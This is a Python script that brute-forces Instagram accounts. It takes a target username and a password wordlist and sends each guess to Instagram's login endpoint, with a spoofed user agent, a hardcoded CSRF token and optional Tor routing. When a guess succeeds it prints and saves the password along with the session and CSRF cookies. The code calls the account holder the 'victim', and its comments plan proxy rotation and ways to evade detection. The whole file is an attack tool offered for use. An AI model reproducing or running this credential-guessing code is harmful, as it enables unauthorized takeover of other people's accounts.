import os
import time
import json
import argparse
import requests
import threading
from datetime import datetime
from fake_user_agents import fake_agent

instagram_url = "https://www.instagram.com/accounts/login/"
instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"

payload = {
    "queryParams" : {},
    "optIntoOneTap" : "false"
}

login_header = {
    "User-Agent" : fake_agent(),
    "X-Requested-With" : "XMLHttpRequest",
    "Referer" : instagram_url
}

# Prompt the user to enter the CSRF token
csrf = "xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe"
login_header.update({"x-csrftoken" : csrf})

# adding local tor proxy "sudo systemctl enable tor"
proxy = {
    'http':  'socks5://localhost:9050',
    'https': 'socks5://localhost:9050',
}

def green(text):
    return "\033[92m{}\033[00m".format(text)

def attack_start_notify(target):
    try:
        os.system(f'herbe "Starting attack to victim: {target}"')
        print(f"Starting attack to victim: {target}")
    except:
        print(f"Starting attack to victim: {target}")

def attack_hack_notify(hack):
    try:
        os.system(f"herbe 'target password founded: {hack}'")
        print(f"[+] target password founded: {hack}")
    except:
        print(f"[+] target password founded: {hack}")

def crack(save, server, password, victim):
    global hack_request
    if server == "on":
        hack_request = requests.post(instagram_url_login, data=payload, headers=login_header, proxies=proxy)
    elif server == "off":
        hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
    threading.Thread(target=attack_start_notify, args=(victim,)).start()
    if save.lower() == "y":
        with open(f"tryed/{victim}", "a") as tryed:
            tryed.write(password)
    print(f"[-] trying password: {password}")
    time.sleep(5)
    hack_data = json.loads(hack_request.text)
    print(f'[{green("INFO")}]: {hack_data}')
    return hack_data

def attack(tor, target, wordlist_file, save):
    tryes = 0
    for hack in wordlist_file:
        tryes += 1
        hack = hack.strip()
        # TOOD add change proxy server after every 10 tryes
        payload.update({
            "enc_password" : f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
        })
        try:
            if crack(save, tor, hack, target)["authenticated"]:
                threading.Thread(target=attack_hack_notify, args=(hack,)).start()
                cookies = hack_request.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar['csrftoken']
                print("csrf_token: ", csrf_token)
                session_id = cookie_jar['sessionid']
                print("session_id: ", session_id)
                with open(f"hacked/{hack}", "a") as hacked:
                    hacked.write(hack)
                break
        except KeyError:
            time.sleep(2)
            print("[-] Instagram detected spam attack\n[+] Changing server to Tor (requires Tor)")
            time.sleep(3)
            # TODO make undetectable
            crack(save, "off", hack, target)

def main():
    target = input("[+] Target username: ")
    payload.update({"username" : target})
    wordlist = input("[+] Wordlist path: ")
    try:
        bruteforce = open(wordlist, "r")
    except FileNotFoundError:
        print("[-] Wordlist file not found\n[+] Trying to open wordlist.txt file")
        try:
            bruteforce = open(f'{wordlist}.txt', 'r')
        except FileNotFoundError:
            print("[-] wordlist.txt file not found")
            exit()
    print(f'[+] Changing wordlist path to {wordlist}.txt')
    save = input("[+] Do you want to save tried passwords (y/n): ")
    if save.lower() == "y":
        print(f"[+] The tried passwords file path will be tryed/{target}.txt")
    
    tor = input("[+] Enter 'tor on' to enable Tor or 'tor off' to disable Tor: ")
    if tor.lower() == "tor on":
        tor_server = "on"
    elif tor.lower() == "tor off":
        tor_server = "off"
    else:
        print("[-] Invalid input for Tor server. Please enter 'tor on' or 'tor off'.")
        exit()

    attack(tor_server, target, bruteforce, save)

if __name__ == "__main__":
    main()
